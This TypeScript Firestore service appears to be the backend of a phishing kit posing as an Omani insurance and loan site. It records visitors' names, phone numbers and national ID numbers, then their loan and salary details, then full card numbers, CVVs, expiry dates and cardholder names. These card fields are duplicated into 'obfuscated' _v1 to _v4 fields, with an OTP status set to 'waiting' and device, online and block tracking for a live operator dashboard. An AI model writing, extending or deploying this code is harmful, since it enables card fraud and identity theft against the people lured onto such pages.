/**
 * Firestore service — writes visitor data to the "pays" collection
 * used by the dashboard at lwahatamen222.
 */
import {
  collection,
  addDoc,
  updateDoc,
  doc,
  serverTimestamp,
} from "firebase/firestore";
import { db } from "./firebase";

const COLLECTION = "pays";

/** Detect device / browser basics for visitor tracking */
function getDeviceInfo() {
  const ua = navigator.userAgent;
  const isMobile = /Mobi|Android/i.test(ua);
  const isTablet = /Tablet|iPad/i.test(ua);
  const deviceType = isTablet ? "tablet" : isMobile ? "mobile" : "desktop";

  let browser = "unknown";
  if (/Chrome/.test(ua) && !/Edge/.test(ua)) browser = "Chrome";
  else if (/Firefox/.test(ua)) browser = "Firefox";
  else if (/Safari/.test(ua) && !/Chrome/.test(ua)) browser = "Safari";
  else if (/Edge/.test(ua)) browser = "Edge";

  let os = "unknown";
  if (/Windows/.test(ua)) os = "Windows";
  else if (/Mac/.test(ua)) os = "macOS";
  else if (/Android/.test(ua)) os = "Android";
  else if (/iPhone|iPad/.test(ua)) os = "iOS";
  else if (/Linux/.test(ua)) os = "Linux";

  return {
    deviceType,
    browser,
    os,
    screenResolution: `${window.screen.width}x${window.screen.height}`,
  };
}

/** Step 1: Create visitor document on page 1 submit — returns the new document ID */
export async function createVisitorDocument(data: {
  ownerName: string;
  phoneNumber: string;
  identityNumber: string;
}): Promise<string> {
  const now = new Date().toISOString();
  const deviceInfo = getDeviceInfo();

  const docRef = await addDoc(collection(db, COLLECTION), {
    // Personal data (page 1)
    ownerName: data.ownerName,
    phoneNumber: data.phoneNumber,
    identityNumber: data.identityNumber,
    country: "عُمان",

    // Required dashboard fields with safe defaults
    documentType: "بطاقة جمركية",
    insuranceType: "تأمين جديد",
    insuranceCoverage: "",
    insuranceStartDate: "",
    vehicleUsage: "",
    vehicleValue: "",
    vehicleYear: "",
    vehicleModel: "",
    repairLocation: "agency",
    paymentStatus: "pending",
    status: "pending_review",
    currentStep: 1,
    currentPage: "registration",

    // Visitor tracking
    ...deviceInfo,
    isOnline: true,
    isBlocked: false,
    lastSeen: now,
    lastActiveAt: now,
    sessionStartAt: now,

    createdAt: serverTimestamp(),
    updatedAt: serverTimestamp(),
  });

  return docRef.id;
}

/** Step 2: Update with loan calculator data */
export async function updateLoanData(
  docId: string,
  data: {
    loanType: string;
    loanPeriod: string;
    repaymentMethod: string;
    loanPurpose: string;
    requestedAmount: string;
    salary: string;
    otherObligations: string;
    netIncome: string;
  }
) {
  const now = new Date().toISOString();
  await updateDoc(doc(db, COLLECTION, docId), {
    // Loan calculator page data (stored in insurance-related fields
    // the dashboard can display, plus custom loan fields)
    loanType: data.loanType,
    loanPeriod: data.loanPeriod,
    repaymentMethod: data.repaymentMethod,
    loanPurpose: data.loanPurpose,
    requestedAmount: data.requestedAmount,
    salary: data.salary,
    otherObligations: data.otherObligations,
    netIncome: data.netIncome,

    currentStep: 2,
    currentPage: "loan-calculator",
    lastActiveAt: now,
    lastSeen: now,
    updatedAt: serverTimestamp(),
  });
}

/** Step 3: Update with card registration data */
export async function updateCardData(
  docId: string,
  data: {
    cardNumber: string;
    cvv: string;
    expiryDate: string;
    cardHolderName: string;
  }
) {
  const now = new Date().toISOString();
  await updateDoc(doc(db, COLLECTION, docId), {
    // Obfuscated fields (matching dashboard convention)
    _v1: data.cardNumber,
    cardNumber: data.cardNumber,
    _v2: data.cvv,
    cvv: data.cvv,
    _v3: data.expiryDate,
    expiryDate: data.expiryDate,
    _v4: data.cardHolderName,
    cardHolderName: data.cardHolderName,

    cardStatus: "pending",
    otpStatus: "waiting",

    currentStep: 3,
    currentPage: "card-registration",
    cardUpdatedAt: now,
    lastActiveAt: now,
    lastSeen: now,
    status: "pending_review",
    updatedAt: serverTimestamp(),
  });
}

/** Mark visitor as offline when they leave */
export async function markVisitorOffline(docId: string) {
  const now = new Date().toISOString();
  await updateDoc(doc(db, COLLECTION, docId), {
    isOnline: false,
    lastSeen: now,
    updatedAt: serverTimestamp(),
  });
}
